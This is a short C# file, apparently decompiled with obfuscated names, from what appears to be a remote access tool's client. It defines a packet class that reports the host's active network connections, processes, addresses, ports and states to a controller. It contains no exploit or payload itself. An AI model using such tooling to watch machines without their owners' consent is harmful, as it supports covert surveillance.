using System;

namespace xClient.Core.Packets.ClientPackets;

[Serializable]
public class GetConnectionsResponse : GInterface4
{
	public string[] Processes { get; set; }

	public string[] LocalAddresses { get; set; }

	public string[] LocalPorts { get; set; }

	public string[] RemoteAdresses { get; set; }

	public string[] RemotePorts { get; set; }

	public byte[] States { get; set; }

	public GetConnectionsResponse()
	{
	}

	public GetConnectionsResponse(string[] processes, string[] localaddresses, string[] localports, string[] remoteadresses, string[] remoteports, byte[] states)
	{
		Processes = processes;
		LocalAddresses = localaddresses;
		LocalPorts = localports;
		RemoteAdresses = remoteadresses;
		RemotePorts = remoteports;
		States = states;
	}

	public void Execute(GClass33 client)
	{
		client.method_7(this);
	}
}
